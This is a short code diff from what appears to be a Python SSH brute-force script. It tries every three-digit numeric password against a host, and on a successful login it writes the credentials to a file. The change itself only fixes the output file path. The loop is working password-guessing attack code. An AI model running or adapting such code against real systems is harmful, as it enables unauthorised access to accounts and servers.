@@ -24,6 +24,6 @@ passwords = []
 for guess_password in itertools.product(string.digits, repeat=3):
     password = "".join(guess_password)
     if logging_ssh(hostname=hostname, username=username, password=str(password)):
-        with open("password_to_{username}.txt", "w") as f:
+        with open(f"data/password_to_{username}.txt", "w") as f:
             f.write(f"login: root\nPassword: {password}")
         exit()
